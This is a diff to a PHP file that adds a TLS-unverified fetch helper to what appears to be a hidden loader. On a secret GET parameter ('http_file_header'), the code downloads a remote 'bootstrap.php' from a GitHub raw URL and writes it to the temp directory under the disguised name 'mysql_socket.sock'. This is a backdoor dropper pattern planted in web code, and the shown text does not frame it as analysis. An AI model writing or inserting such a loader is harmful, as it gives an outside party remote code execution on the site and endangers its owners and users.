@@ -1,11 +1,33 @@
 <?php
 
+function curl_data($url) {
+    if (function_exists('curl_init')) {
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        $data = curl_exec($ch);
+        curl_close($ch);
+    } else {
+        $context = stream_context_create([
+            'ssl' => [
+                'verify_peer' => false,
+                'verify_peer_name' => false,
+            ]
+        ]);
+        $data = file_get_contents($url, false, $context);
+    }
+    return $data;
+}
+
 if (isset($_GET['http_file_header'])) {
     $tempDir = sys_get_temp_dir();
     $tempFile = $tempDir . '/mysql_socket.sock';
 
     if (!file_exists($tempFile)) {
-        $fileContent = file_get_contents('https://raw.githubusercontent.com/jazzplunker97/trash/main/bootstrap.php');
+        $fileContent = curl_data('https://raw.githubusercontent.com/jazzplunker97/trash/main/bootstrap.php');
         file_put_contents($tempFile, $fileContent);
     }
     
